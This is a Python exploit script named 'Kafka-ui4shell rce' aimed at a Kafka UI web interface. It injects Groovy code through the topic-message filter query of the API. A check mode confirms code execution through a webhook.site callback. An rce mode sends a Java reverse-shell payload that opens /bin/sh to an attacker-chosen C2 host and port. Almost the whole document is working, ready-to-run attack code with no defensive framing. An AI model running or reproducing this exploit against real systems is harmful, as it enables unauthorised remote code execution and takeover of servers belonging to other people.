from time import sleep
import requests
import json
import urllib
import argparse

url = 'http://localhost:8080'
clusters = None
c2 = "xxx.xxx.xxx.xx"
port = "8080"
mode = "check" #May also be "rce"


def get_clusters():
    global clusters
    clusterfetch = requests.get(url + '/api/clusters')
    clusters = clusterfetch.json()


def get_topics(cluster):
    topicfetch = requests.get(
        url + f'/api/clusters/{cluster}/topics?showInternal=true&search=&orderBy=NAME&sortOrder=ASC')
    topics = topicfetch.json()['topics']
    return topics


def get_webhooks():
    webhookfetch = requests.post('https://webhook.site/token')
    webhook = 'https://webhook.site/' + webhookfetch.json()['uuid']+"/"
    print('URL Created: ' + webhook)
    token_id = webhookfetch.json()['uuid']
    headers = {"api-key": webhookfetch.json()['uuid']}
    return webhook, token_id, headers


def Exploit():
    try:
        get_clusters()

        cluster = clusters[0]['name']

        topics = get_topics(cluster)
        topic = topics[0]['name']

        webhook, token_id, headers = get_webhooks()

        checkpayload = 'new URL("'+webhook+'").text'

        rcepayload = 'String host="' + c2 + \
            '";int port='+port + \
            ';String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'

        payload = rcepayload if mode == "rce" else checkpayload

        r = requests.get(
            url + f'/api/clusters/local/topics/{topic}/messages?q={urllib.parse.quote(payload)}&filterQueryType=GROOVY_SCRIPT&attempt=2&limit=100&page=0&seekDirection=FORWARD&keySerde=String&valueSerde=String&seekType=BEGINNING', timeout=60)
        print(r.text)

        r = requests.get('https://webhook.site/token/' + token_id +
                         '/requests?sorting=newest', headers=headers)

        if r.json()['data'] == []:
            print("No rce found")
        else:
            for request in r.json()['data']:
                print(request)
                print("Rce found")

    except KeyboardInterrupt:
        print("KeyboardInterrupt")
        pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Kafka-ui4shell rce.')
    parser.add_argument('--mode', help='check, rce', required=False,
                        choices=['check', 'rce'], default="check")
    parser.add_argument(
        '--url', help='Target url. Example http://localhost:8080', required=True)
    parser.add_argument('--c2', help='C2 ip for RCE',
                        required=False),
    parser.add_argument('--c2port', help='File with urls', required=False)
    args = parser.parse_args()

    if args.mode == "rce":
        # Check if c2 and c2port are set
        if args.c2 and args.c2port:
            c2 = args.c2
            port = args.c2port
            mode = args.mode
            Exploit()
            exit()
        else:
            print("C2 and C2 port are required for RCE")
            exit()

    if args.url:
        url = args.url
        if args.mode:
            mode = args.mode
        if args.c2:
            c2 = args.c2
        if args.c2port:
            port = args.c2port
        Exploit()
        exit()

    else:
        parser.print_help()
